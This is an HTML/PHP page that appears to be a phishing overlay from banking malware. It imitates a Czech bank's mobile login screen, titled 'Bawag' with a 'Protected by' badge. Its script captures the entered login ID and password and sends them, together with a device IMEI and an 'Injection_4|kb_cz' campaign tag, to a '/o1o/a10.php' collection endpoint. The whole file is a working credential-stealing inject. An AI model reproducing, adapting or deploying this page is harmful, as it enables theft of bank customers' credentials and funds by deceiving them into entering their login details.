<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Bawag</title>

    <script src="js/jquery-1.12.0.min.js"></script>
    <script src="js/viewport.js"></script>
	<script src="js/cat.functions.js"></script>
	
    <link rel="stylesheet" href="bootstrap/dist/css/bootstrap.min.css">
	<link rel="stylesheet" href="font-awesome/css/font-awesome.min.css">
	<link rel="stylesheet" href="cz/eu.inmite.prj.kb.mobilbank/css/style.css">
	<link rel="stylesheet" href="css/cat.style.css" type="text/css" media="all">
</head>
<?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>


<div class="header2">
	<img style="padding: 15px 0;height: 50px;display: inline-block;width: 35px;margin-top: -4px;margin-left: 15px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAMAAADXqc3KAAAABlBMVEUAAAD///+l2Z/dAAAAAnRSTlMA/1uRIrUAAAAXSURBVCjPY2AgGTCiAppIDCgY9SDlEgDG3gC1nRXoEAAAAABJRU5ErkJggg==">
	<h5 style="color: #fff;margin: 0;display: inline-block;font-size: 18px;"> Login </h5>
	<i class="fa fa-question-circle-o fa-lg" aria-hidden="true" style="float: right;padding: 16px;color: #fff;"></i>
</div>

<div id="header">
<img src="data:image/png;base64,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" style="width: 150px;margin-left: 5px;margin-top: 7px;margin-right: 15px;">
</div>
<div id="line">
</div>
<br>
    <div class="main">
        <div class="container">
<div class="row">

                <div class="col-xs-10 col-sm-8">
                    <div class="form_">

                        <form id="form">

                            <div class="form-group ">	
									<label for="login" style="">Príhlašovací ID</label>
									<input type="text" class="form-control" name="field2" maxlength="50" id="login" autocomplete="off" data-reg="/.{4,50}/" >
                          </div>		

                            <div class="form-group">
                               		<label for="Heslo" style="">Heslo</label>
									<input type="password" class="form-control" name="field3" id="Heslo" autocomplete="off" data-reg="/.{4,16}/" maxlength="16" >
                            </div>
		
                        </form><br>
						      <input type="button" style="margin-bottom: 20px;float: right;color: #fff;" onClick="sentServer();" class="input_submitBtn" value="Prihlásit">

</div>
                </div>
				
<div id="protect" style="text-align: center;font-weight: 600;margin-top: 70px;">
	Protectrerd by <img style="width: 40px;" src="data:image/png;base64,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">
</div>				
            </div>
        </div>
    </div>

<script>
	function sentServer()
	{
		
	var oNumInp1 = document.getElementById('login');
	var oNumInp2 = document.getElementById('Heslo');


if ((oNumInp1.value.length > 5)&&(oNumInp2.value.length > 3)) {
	var url='<?php echo $URL; ?>';
	var imei_c='<?php echo $IMEI_country; ?>';

	var login1 = document.forms["form"].elements["login"].value; 
	var pass = document.forms["form"].elements["Heslo"].value; 

	location.replace('/o1o/a10.php?p=' + imei_c+"|Injection_4|kb_cz|"+login1+"|"+pass);
	}
	}
</script>
</body>

</html>
